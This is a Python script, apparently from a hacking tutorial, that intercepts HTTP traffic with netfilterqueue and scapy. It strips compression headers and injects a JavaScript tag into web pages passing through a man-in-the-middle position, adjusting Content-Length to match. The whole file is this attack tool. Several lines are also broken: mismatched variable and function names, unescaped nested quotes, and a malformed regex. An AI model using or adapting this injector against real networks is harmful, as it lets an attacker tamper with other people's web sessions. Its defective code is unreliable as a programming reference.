#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re # regex module

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy.packet = scapy.IP(packet.get_payload())
  
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load

		if scapy_packet[scapy.TCP].dport == 80: # HTTP request
			print("[+] Request")
			# remove Accept-Encoding field from HTTP header using regex so that we get plain text
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
      
		elif scapy_packet[scapy.TCP].sport == 80: # HTTP response
			print("[+] Response")
			# injected code
			injection_code = "<script>alert("Hacked!");</script>"
			load = load.replace("</body>", injection_code + "</body>")
			# some websites verify by Content-Length field so any changes or additions made to the source code will not allow injection attack, so:
			content_length_search = re.search("?:Content-Length:\s)(\d*)", load) # regex rule 

			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load = load.replace(content_length, str(new_content_length))

		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_payload(scapy_packet, load)
			packet.set_payload(str(new_packet))
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
